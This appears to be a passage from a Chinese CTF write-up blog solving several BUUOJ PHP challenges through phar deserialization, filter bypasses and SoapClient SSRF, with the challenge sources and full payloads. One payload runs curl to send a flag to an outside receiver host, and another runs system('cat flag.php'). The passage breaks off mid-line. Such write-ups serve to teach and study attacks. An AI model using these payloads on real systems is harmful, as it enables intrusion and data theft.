<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// func.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"url"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i'</span>,$_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Go away!"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $file_path = $_POST[<span class="string">'url'</span>];</span><br><span class="line">        $file = <span class="keyword">new</span> File($file_path);</span><br><span class="line">        $file-&gt;getMIME();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line">    <span class="keyword">public</span> $type;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"Check"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">        $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        $a-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getMIME</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;type = finfo_file($finfo, <span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $data = file_get_contents(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        <span class="keyword">if</span> (mb_strpos($data, <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&amp;lt;? in contents!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>功能有两个</p>
<ul>
<li>上传图片文件, 其中过滤了文件内容不能有&lt;? , 可以用script标签绕过</li>
<li>发送图片的url地址并查看他的类型, 对这个地址会有一个过滤, 可以用<code>php://filter/resource=phar://xxxxxxx</code>来绕过, 查看类型的时候<code>finfo_file</code>函数可以触发<code>phar</code>反序列化</li>
</ul>
<p>思路:</p>
<ul>
<li>传phar然后触发他, wake方法可以让我们构造任意的类</li>
<li>构造SoapClient类去访问admin.php, 带上post数据</li>
</ul>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'test.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;script language="php"&gt;__HALT_COMPILER();&lt;/script&gt;'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"SoapClient"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/admin.php"</span>;</span><br><span class="line">        $post_string = <span class="string">'admin=1&amp;cmd=curl --referer "`/readflag`" --insecure \'http://xss.buuoj.cn/index.php?do=api%26id=uHi9SZ\’&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=111'</span>. <span class="string">"\r\n"</span>;</span><br><span class="line">        $headers = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name  = [</span><br><span class="line">            <span class="keyword">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                  <span class="string">'user_agent'</span>=&gt; str_replace(<span class="string">'^^'</span>, <span class="string">"\r\n"</span>, <span class="string">'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'Content-Length: '</span>. (string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string),</span><br><span class="line">                  <span class="string">'uri'</span>=&gt;<span class="string">'hello'</span>)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = <span class="keyword">new</span> File;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($object));</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<h2 id="SWPUCTF-2018-SimplePHP">SWPUCTF 2018 SimplePHP</h2>
<p>开局就这样</p>
<p><img src="/images/image-20200111181325284.png" alt="image-20200111181325284"></p>
<p>功能点:</p>
<ul>
<li>上传文件</li>
<li>查看文件</li>
</ul>
<p>观察查看文件的url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://0d155bab-764e-40b0-bcfd-471741e92e66.node3.buuoj.cn/file.php?file=</span><br></pre></td></tr></table></figure>
<p>file参数写上index.php, 然后就读到了源码…最后思路也就是<code>file_exists</code>去触发phar反序列化代码, payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="comment">// public function __construct($name)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;str = $name;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// public function __destruct()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;test = $this-&gt;str;</span></span><br><span class="line">    <span class="comment">//     echo $this-&gt;test;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="comment">// public function __construct($file)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">    <span class="comment">//     echo $this-&gt;source;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="comment">// public function __construct()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;params = array();</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"exp.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"exp.phar"</span>);</span><br><span class="line">$phar -&gt; startBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$object = <span class="keyword">new</span> C1e4r();</span><br><span class="line">$a = <span class="keyword">new</span> Show();</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> Test();</span><br><span class="line">$b-&gt;params = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'source'</span>=&gt;<span class="string">'/var/www/html/f1ag.php'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$a-&gt;str = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'str'</span> =&gt; $b</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$object-&gt;str = $a;</span><br><span class="line"></span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/image-20200111181618457.png" alt="image-20200111181618457"></p>
<h2 id="GXYCTF-2019-BabysqliV3-0">GXYCTF 2019 BabysqliV3.0</h2>
<p>开局登录界面, 查看源代码发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- u9db8 --&gt;</span><br></pre></td></tr></table></figure>
<p>查一下</p>
<p><img src="/images/image-20200110110120901.png" alt="image-20200110110120901"></p>
<p>是这么个玩意, 后来才知道这是弱口令的提示(…)</p>
<p>总之<code>admin</code>和<code>password</code>来登录就行了, 来到了一个文件上传的界面, 观察url后使用php伪协议读源代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://3f106e17-926a-45ea-a89c-7f6043c0a1c7.node3.buuoj.cn/home.php?file=php://filter/read=convert.base64-encode/resource=home</span><br></pre></td></tr></table></figure>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// home.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; &lt;title&gt;Home&lt;/title&gt;"</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'user'</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">"/.?f.?l.?a.?g.?/i"</span>, $_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"hacker!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">"/home$/i"</span>, $_GET[<span class="string">'file'</span>]) <span class="keyword">or</span> preg_match(<span class="string">"/upload$/i"</span>, $_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">				$file = $_GET[<span class="string">'file'</span>].<span class="string">".php"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				$file = $_GET[<span class="string">'file'</span>].<span class="string">".fxxkyou!"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"å½åå¼ç¨çæ¯ "</span>.$file;</span><br><span class="line">			<span class="keyword">require</span> $file;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"no permission!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// upload.php</span></span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">	ä¸ä¼ æä»¶</span><br><span class="line">	&lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> /&gt;</span><br><span class="line">	&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"ä¸ä¼ "</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $Filename;</span><br><span class="line">	<span class="keyword">public</span> $cmd;</span><br><span class="line">	<span class="keyword">public</span> $token;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$sandbox = getcwd().<span class="string">"/uploads/"</span>.md5($_SESSION[<span class="string">'user'</span>]).<span class="string">"/"</span>;</span><br><span class="line">		$ext = <span class="string">".txt"</span>;</span><br><span class="line">		@mkdir($sandbox, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> !preg_match(<span class="string">"/data:\/\/ | filter:\/\/ | php:\/\/ | \./i"</span>, $_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">'name'</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">'user'</span>].$ext;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">$this</span>-&gt;cmd = <span class="string">"echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';"</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">"[^a-z0-9]"</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('illegal filename!');"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>($file[<span class="string">'size'</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('you are too big (â²â½`ã)');"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">"move_uploaded_file('"</span>.$file[<span class="string">'tmp_name'</span>].<span class="string">"', '"</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">"');"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line">		<span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">'user'</span>])&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('check token falied!');"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">	$uploader = <span class="keyword">new</span> Uploader();</span><br><span class="line">	$uploader-&gt;upload($_FILES[<span class="string">"file"</span>]);</span><br><span class="line">	<span class="keyword">if</span>(@file_get_contents($uploader))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼&lt;br&gt;"</span>.$uploader.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> file_get_contents($uploader);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="解法一">解法一</h3>
<p>由于出题人的疏漏, 导致可以直接上传shell并指定文件名</p>
<p><img src="/images/image-20200110111413037.png" alt="image-20200110111413037"></p>
<h3 id="解法二">解法二</h3>
<p>使用phar生成文件上传, 然后指定一个文件名去读取触发phar中的反序列化代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $Filename;</span><br><span class="line">        <span class="keyword">public</span> $cmd=<span class="string">"system('cat flag.php');"</span>;</span><br><span class="line">        <span class="keyword">public</span> $token=<span class="string">"GXY7932b2783659b99ad9b932433b02acc1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"exp.phar"</span>);</span><br><span class="line">	$phar = <span class="keyword">new</span> Phar(<span class="string">"exp.phar"</span>);</span><br><span class="line">	$phar -&gt; startBuffering();</span><br><span class="line">	$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">	$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">	$object = <span class="keyword">new</span> Uploader();</span><br><span class="line">	$phar -&gt; setMetadata($object);</span><br><span class="line">	$phar -&gt; stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上传之后在随便上传什么东西, 指定好文件名就可以</p>
<p><img src="/images/image-20200110111526262.png" alt="image-20200110111526262"></p>
<h2 id="HarekazeCTF2019-easynote">HarekazeCTF2019 easynote</h2>
<p>看着wp复现复现</p>
<p>开局是这样的</p>
<p><img src="/images/image-20191230162838903.png" alt="image-20191230162838903"></p>
<p>登录之后有添加笔记删除笔记导出笔记和获取flag功能</p>
<p><img src="/images/image-20191230162858039.png" alt="image-20191230162858039"></p>
<p>关键源代码如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">          <span class="keyword">if</span> (is_admin()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! The flag is: &lt;code&gt;"</span> . getenv(<span class="string">'FLAG'</span>) . <span class="string">"&lt;/code&gt;"</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You are not an admin :("</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">lib.php</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'admin'</span>])) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $_SESSION[<span class="string">'admin'</span>] === <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_note</span><span class="params">($title, $body)</span> </span>&#123;</span><br><span class="line">  $notes = get_notes();</span><br><span class="line">  array_push($notes, [</span><br><span class="line">    <span class="string">'title'</span> =&gt; $title,</span><br><span class="line">    <span class="string">'body'</span> =&gt; $body,</span><br><span class="line">    <span class="string">'id'</span> =&gt; hash(<span class="string">'sha256'</span>, microtime())</span><br><span class="line">  ]);</span><br><span class="line">  $_SESSION[<span class="string">'notes'</span>] = $notes;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">init.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib.php'</span>);</span><br><span class="line"></span><br><span class="line">session_save_path(TEMP_DIR);</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">export.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'init.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_logged_in()) &#123;</span><br><span class="line">  redirect(<span class="string">'/?page=home'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$notes = get_notes();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'type'</span>]) || <span class="keyword">empty</span>($_GET[<span class="string">'type'</span>])) &#123;</span><br><span class="line">  $type = <span class="string">'zip'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $type = $_GET[<span class="string">'type'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filename = get_user() . <span class="string">'-'</span> . bin2hex(random_bytes(<span class="number">8</span>)) . <span class="string">'.'</span> . $type;</span><br><span class="line">$filename = str_replace(<span class="string">'..'</span>, <span class="string">''</span>, $filename); <span class="comment">// avoid path traversal</span></span><br><span class="line">$path = TEMP_DIR . <span class="string">'/'</span> . $filename;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($type === <span class="string">'tar'</span>) &#123;</span><br><span class="line">  $archive = <span class="keyword">new</span> PharData($path);</span><br><span class="line">  $archive-&gt;startBuffering();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// use zip as default</span></span><br><span class="line">  $archive = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">  $archive-&gt;open($path, ZIPARCHIVE::CREATE | ZipArchive::OVERWRITE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($index = <span class="number">0</span>; $index &lt; count($notes); $index++) &#123;</span><br><span class="line">  $note = $notes[$index];</span><br><span class="line">  $title = $note[<span class="string">'title'</span>];</span><br><span class="line">  $title = preg_replace(<span class="string">'/[^!-~]/'</span>, <span class="string">'-'</span>, $title);</span><br><span class="line">  $title = preg_replace(<span class="string">'#[/\\?*.]#'</span>, <span class="string">'-'</span>, $title); <span class="comment">// delete suspicious characters</span></span><br><span class="line">  $archive-&gt;addFromString(<span class="string">"&#123;$index&#125;_&#123;$title&#125;.json"</span>, json_encode($note));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($type === <span class="string">'tar'</span>) &#123;</span><br><span class="line">  $archive-&gt;stopBuffering();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $archive-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Disposition: attachment; filename="'</span> . $filename . <span class="string">'";'</span>);</span><br><span class="line">header(<span class="string">'Content-Length: '</span> . filesize($path));</span><br><span class="line">header(<span class="string">'Content-Type: 